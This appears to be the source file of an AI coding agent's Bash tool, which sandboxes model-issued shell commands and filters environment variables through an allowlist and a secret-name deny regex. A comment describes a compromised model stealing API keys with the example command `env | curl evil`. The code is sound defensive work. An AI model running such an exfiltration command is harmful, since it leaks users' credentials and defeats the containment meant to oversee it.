/**
 * Built-in Bash shell command execution tool.
 *
 * Spawns commands under an optional OS-level sandbox (Seatbelt on macOS,
 * bubblewrap on Linux). The sandbox is selected by the Engine and handed
 * down via ToolContext.sandbox. Without a sandbox we fall back to the
 * historical behavior — plain shell spawn in the user's environment.
 *
 * The actual lifecycle (spawn, IO drain, byte cap, abort cascade, timeout
 * cascade, listener cleanup) lives in {@link safeSpawnShell}. This file
 * keeps only Bash-specific concerns:
 *
 *   - The env allowlist + deny regex (a Bash threat-model thing — REPL /
 *     PowerShell don't have free-form shell injection from the LLM).
 *   - The final user-facing output formatting (STDERR: prefix, Exit code,
 *     Killed by signal, the truncation message, sandbox denial hints).
 */

import type { ToolContext } from "../context.js";
import { createOffBackend } from "../sandbox/off.js";
import { safeSpawnShell } from "../../runtime/safe-spawn.js";
import type { ToolDefinition } from "../../types.js";

export const bashToolDef: ToolDefinition = {
  name: "Bash",
  description:
    "Execute a shell command and return its output. " +
    "Commands run in the user's default shell. Use for system operations, " +
    "git commands, running tests, installing packages, etc.",
  inputSchema: {
    type: "object",
    properties: {
      command: { type: "string", description: "The shell command to execute" },
      timeout: {
        type: "number",
        description: "Timeout in milliseconds (default: 120000). Outer registry caps at 1h.",
      },
      description: {
        type: "string",
        description: "Short description of what the command does",
      },
    },
    required: ["command"],
  },
};

const MAX_OUTPUT = 100_000;
const MAX_BUFFER = 10 * 1024 * 1024;

/**
 * Env vars that are always safe to forward into the sandboxed shell. We pass
 * through enough for common Unix tooling (locale, PATH, HOME, terminal width)
 * but strip everything else. The Bash tool is the only thing the LLM can
 * directly steer at the shell, and a tainted model with full env access can
 * trivially exfiltrate `OPENROUTER_API_KEY` / `AWS_*` / `SSH_AUTH_SOCK` via
 * `env | curl evil`. Filesystem-level deniedReads don't help once secrets are
 * already in the process environment.
 *
 * `off` backend keeps the historical full-passthrough behavior — the user
 * explicitly opted out of sandboxing.
 */
const ENV_ALLOWLIST = new Set([
  "PATH",
  "HOME",
  "USER",
  "LOGNAME",
  "SHELL",
  "LANG",
  "LC_ALL",
  "LC_CTYPE",
  "TERM",
  "TMPDIR",
  "TZ",
  "COLUMNS",
  "LINES",
  "PWD",
]);

/**
 * Names matching these patterns are dropped even if they appear in the
 * allowlist (defense in depth — e.g. a user setting `PATH_TOKEN` shouldn't
 * leak just because it starts with `PATH`). Match is case-insensitive on
 * the full name.
 */
const ENV_DENY_REGEX = /(KEY|TOKEN|SECRET|PASSWORD|PASSWD|CREDENTIAL|SESSION|AUTH|COOKIE|PRIVATE)/i;

function buildSandboxEnv(): NodeJS.ProcessEnv {
  const out: NodeJS.ProcessEnv = {};
  for (const name of ENV_ALLOWLIST) {
    const v = process.env[name];
    if (v !== undefined && !ENV_DENY_REGEX.test(name)) {
      out[name] = v;
    }
  }
  return out;
}

export async function bashTool(
  args: Record<string, unknown>,
  ctx?: ToolContext,
): Promise<string> {
  const command = args.command as string;
  if (!command) return "Error: command is required";

  const timeout = (args.timeout as number) || 120_000;
  const cwd = ctx?.cwd ?? process.cwd();
  const shell = process.env.SHELL || "/bin/bash";
  const backend = ctx?.sandbox ?? createOffBackend();
  const env = backend.name === "off" ? { ...process.env } : buildSandboxEnv();

  // A6: lifecycle (spawn, kill cascade, IO drain, byte cap, abort/timeout)
  // is centralized in safeSpawnShell. We still handle Bash's user-facing
  // output formatting here.
  // Capture pre-spawn abort state so we can produce the historical
  // "aborted before starting" message; SafeSpawn collapses both pre- and
  // mid-flight abort to aborted=true.
  const wasAbortedBeforeStart = ctx?.signal?.aborted === true;
  const result = await safeSpawnShell(command, {
    cwd,
    env,
    timeoutMs: timeout,
    maxOutputBytes: MAX_BUFFER,
    sandbox: backend,
    shell,
    signal: ctx?.signal,
  });

  if (result.aborted) {
    return wasAbortedBeforeStart ? "Bash aborted before starting." : "Bash aborted by signal.";
  }
  if (result.timedOut) {
    return `Command timed out after ${timeout}ms`;
  }
  if (result.spawnFailed) {
    return `Failed to spawn command: ${result.error ?? "unknown error"}`;
  }

  let output = "";
  if (result.stdout) output += result.stdout;
  if (result.stderr) output += (output ? "\n" : "") + `STDERR:\n${result.stderr}`;
  if (!output) output = "(command completed with no output)";

  const code = result.exitCode;
  const sig = result.signal;
  if (code !== 0 && code !== null) {
    output = `Exit code: ${code}\n${output}`;
  } else if (code === null && sig) {
    // Killed by a signal we didn't time out on — OOM-kill, sandbox-kill,
    // external SIGKILL. Surface so the model can distinguish from our
    // own timeout path above.
    output = `Killed by signal: ${sig}\n${output}`;
  }

  const hint = backend.hintForBlockedOutput?.(result.stderr);
  if (hint) output += hint;

  if (output.length > MAX_OUTPUT) {
    output =
      output.slice(0, MAX_OUTPUT) +
      `\n\n... output truncated (${output.length} chars total)`;
  }

  return output;
}
